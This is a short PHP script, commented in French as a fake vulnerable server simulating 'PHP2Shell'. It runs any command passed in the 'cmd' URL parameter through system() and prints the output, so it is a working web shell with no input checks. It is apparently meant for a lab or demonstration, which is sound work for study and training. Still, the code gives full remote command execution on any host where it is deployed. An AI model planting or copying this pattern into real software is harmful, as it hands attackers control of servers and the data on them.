<?php
// Faux serveur vulnérable (simulation de PHP2Shell)
// La faille : le paramètre "cmd" est exécuté directement
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "Serveur en ligne. Utilisez ?cmd= pour exécuter une commande.";
}
?>
